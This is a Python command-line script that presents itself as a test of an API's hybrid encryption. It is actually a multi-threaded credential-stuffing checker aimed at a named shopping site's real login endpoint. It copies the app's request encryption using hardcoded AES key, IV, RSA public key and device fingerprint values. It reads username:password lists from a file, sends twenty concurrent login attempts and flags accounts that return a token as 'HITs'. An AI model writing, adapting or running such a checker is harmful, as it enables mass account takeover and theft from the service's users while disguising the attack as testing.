# This is a standalone command-line tool to test the API's hybrid encryption.
# It supports both single credential checks and high-speed, multi-threaded batch testing from a file.
#
# Requirements:
# pip install pycryptodome requests
#
# Usage:
#   For a single account:
#   python api_cli.py --username "user@example.com" --password "your_password"
#
#   For batch testing from a file:
#   python api_cli.py --file "credentials.txt"

import base64
import json
import zlib
import requests
import threading
import time
import argparse
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Core Cryptography and API Logic ---

RSA_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCx2UKNVOg0dYx1R3p7GNAXcrRQ
7QkiE43UFbHxLPJ8gpWFxhSb6ZoCGO/8AkAFEgroJ7NKUhRyq71vCjDFJh8n7zjA
6rgIxKOPNwndHlXBLBj60avRb14BrunQ5EijwGpUF9jUeLrLO3GNd39T4l1RC0jj
TBa0hpKpGNGfQAd7rwIDAQAB
-----END PUBLIC KEY-----"""

def encrypt_aes_payload(data_dict, key_string, iv_string):
    try:
        json_string = json.dumps(data_dict, separators=(',', ':'), sort_keys=False, ensure_ascii=True)
        compressor = zlib.compressobj(level=1, method=zlib.DEFLATED, wbits=-15)
        compressed_bytes = compressor.compress(json_string.encode('utf-8')) + compressor.flush()
        pad_len = AES.block_size - (len(compressed_bytes) % AES.block_size)
        padded_bytes = compressed_bytes + bytes([pad_len]) * pad_len
        key_bytes = key_string.encode('utf-8')
        iv_bytes = iv_string.encode('utf-8')
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        encrypted_bytes = cipher.encrypt(padded_bytes)
        return base64.b64encode(encrypted_bytes).decode('utf-8')
    except Exception as e:
        return f"AES Encryption Error: {e}"

def encrypt_rsa(data_string):
    try:
        rsa_key = RSA.import_key(RSA_PUBLIC_KEY_PEM)
        cipher_rsa = PKCS1_v1_5.new(rsa_key)
        encrypted_data = cipher_rsa.encrypt(data_string.encode('utf-8'))
        return base64.b64encode(encrypted_data).decode('utf-8')
    except Exception as e:
        return f"RSA Encryption Error: {e}"

def decrypt_and_decompress_payload(encrypted_data_b64, key_string, iv_string):
    try:
        padding_needed = len(encrypted_data_b64) % 4
        if padding_needed:
            encrypted_data_b64 += '=' * (4 - padding_needed)
        encrypted_bytes = base64.b64decode(encrypted_data_b64)
        key_bytes = key_string.encode('utf-8')
        iv_bytes = iv_string.encode('utf-8')
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded_plaintext = cipher.decrypt(encrypted_bytes)
        pad_len = padded_plaintext[-1]
        if pad_len > AES.block_size or pad_len == 0:
            raise ValueError("Invalid padding value.")
        plaintext_bytes = padded_plaintext[:-pad_len]
        decompressed_bytes = zlib.decompress(plaintext_bytes, wbits=-15)
        return json.loads(decompressed_bytes.decode('utf-8'))
    except Exception as e:
        return {"error": f"Decryption Failed: {e}"}

def perform_request(username, password, url):
    """Performs a single login request and returns the result."""
    try:
        key, iv = "cfc0d8be37e5ca838da40740d6723a0f", "7b242d789da2c4c7"
        
        plaintext_data = {
            "versionCode": "211", "from": "1201",
            "fp": "f271d21900168bbf9125654e33b3b6db", "referer": "",
            "uuid": "f6d98180-876d-11f0-bd09-fdf3fcb93db6", "cur": "USD",
            "username": username, "password": password, "captcha": ""
        }

        encrypted_data = encrypt_aes_payload(plaintext_data, key, iv)
        encrypted_key_rsa, encrypted_iv_rsa = encrypt_rsa(key), encrypt_rsa(iv)
        
        if "Error" in encrypted_data or "Error" in encrypted_key_rsa or "Error" in encrypted_iv_rsa:
            raise Exception("Encryption failed during payload creation.")

        request_body = {"data": encrypted_data, "req_code": 4, "key": encrypted_key_rsa, "iv": encrypted_iv_rsa}
        
        response = requests.post(url, json=request_body, headers={"Content-Type": "application/json"})
        response.raise_for_status()
        response_json = response.json()
        
        is_hit = False
        encrypted_response_data = response_json.get("data")
        if encrypted_response_data:
            decrypted_response = decrypt_and_decompress_payload(encrypted_response_data, key, iv)
            if isinstance(decrypted_response, dict) and decrypted_response.get("token"):
                is_hit = True
        
        return is_hit, f"{username}:{password}", response_json

    except Exception as e:
        return False, f"{username}:{password}", {"error": str(e)}

def main():
    parser = argparse.ArgumentParser(description="A CLI tool to test the API's hybrid encryption.")
    parser.add_argument("-u", "--username", help="Single username (email) to test.")
    parser.add_argument("-p", "--password", help="Single password to test.")
    parser.add_argument("-f", "--file", help="Path to a file with 'username:password' credentials, one per line.")
    parser.add_argument("--url", default="https://hbapi.kakobuy.com/api/user/login", help="The target API URL.")
    args = parser.parse_args()

    if args.file:
        print(f"--- Starting Batch Test from file: {args.file} ---")
        try:
            with open(args.file, 'r') as f:
                credentials = [line.strip().split(':', 1) for line in f if ':' in line]
        except FileNotFoundError:
            print(f"Error: File not found at '{args.file}'")
            return

        total = len(credentials)
        hits = 0
        fails = 0
        checked = 0
        
        stop_event = threading.Event()

        def signal_handler():
            print("\n--- Stop signal received. Finishing current tasks... ---")
            stop_event.set()

        # This allows stopping with Ctrl+C
        import signal
        signal.signal(signal.SIGINT, lambda s, f: signal_handler())

        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_creds = {executor.submit(perform_request, u, p, args.url): (u, p) for u, p in credentials}
            
            for future in as_completed(future_to_creds):
                if stop_event.is_set():
                    break
                
                username, password = future_to_creds[future]
                try:
                    is_hit, creds, response_data = future.result()
                    checked += 1
                    if is_hit:
                        hits += 1
                        print(f"\033[92m[+]\033[0m HIT: {creds}") # Green for success
                    else:
                        fails += 1
                        error_msg = response_data.get("msg", "Unknown error")
                        print(f"\033[91m[-]\033[0m FAIL: {creds} -> {error_msg}") # Red for fail
                except Exception:
                    checked += 1
                    fails += 1
                    print(f"\033[91m[-]\033[0m FAIL: {creds} -> Request Exception")
        
        print("\n--- Test Complete ---")
        print(f"Total Checked: {checked}/{total} | Successful Hits: {hits} | Fails: {fails}")

    elif args.username and args.password:
        print("--- Starting Single Request Test ---")
        is_hit, creds, response_data = perform_request(args.username, args.password, args.url)
        if is_hit:
            print(f"\033[92m[+]\033[0m SUCCESSFUL LOGIN: {creds}")
            print("Decrypted Response:", json.dumps(response_data, indent=2))
        else:
            print(f"\033[91m[-]\033[0m FAILED LOGIN: {creds}")
            print("Server Response:", json.dumps(response_data, indent=2))
    else:
        print("Error: Please provide credentials to test.")
        print("Usage: python api_cli.py --username <user> --password <pass>")
        print("   or: python api_cli.py --file <path_to_file>")

if __name__ == "__main__":
    main()


